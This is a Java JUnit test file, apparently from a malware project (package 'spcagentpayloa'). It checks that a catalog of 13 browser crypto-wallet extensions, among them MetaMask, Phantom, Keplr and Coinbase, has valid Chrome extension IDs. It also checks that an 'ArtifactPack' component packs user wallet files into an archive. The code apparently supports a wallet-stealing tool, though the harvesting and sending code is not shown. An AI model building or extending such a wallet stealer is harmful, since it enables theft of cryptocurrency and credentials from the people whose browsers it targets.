package com.spcagentpayloa.jvmxx.crypto;

import org.junit.jupiter.api.Test;

import java.util.HashSet;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Catalog shape: every requested extension is present once, with a valid id. */
class WalletCatalogTest {
	@Test
	void coversEveryRequestedExtension() {
		for (String name : new String[] {
			"metamask", "phantom", "rabby", "keplr", "coinbase", "solflare", "tronlink",
			"trust", "binance", "yoroi", "nami", "xdefi", "backpack"
		}) {
			assertTrue(CryptoPaths.EXTENSIONS.containsKey(name), name);
		}
		assertEquals(13, CryptoPaths.EXTENSIONS.size());
	}

	@Test
	void idsAreChromeShapedAndUnique() {
		Set<String> seen = new HashSet<>();
		for (String id : CryptoPaths.EXTENSIONS.values()) {
			assertEquals(32, id.length());
			assertTrue(id.matches("[a-p]{32}"), id);
			assertTrue(seen.add(id), id);
		}
	}

	@Test
	void containerSanitizesTraversal() {
		assertEquals("Users/a/wallets/a.json", ArtifactPack.sanitize("C:\\Users\\a\\wallets\\a.json"));
		assertEquals("a/b", ArtifactPack.sanitize("../../a//b"));
		assertEquals("unnamed", ArtifactPack.sanitize(""));
	}
}
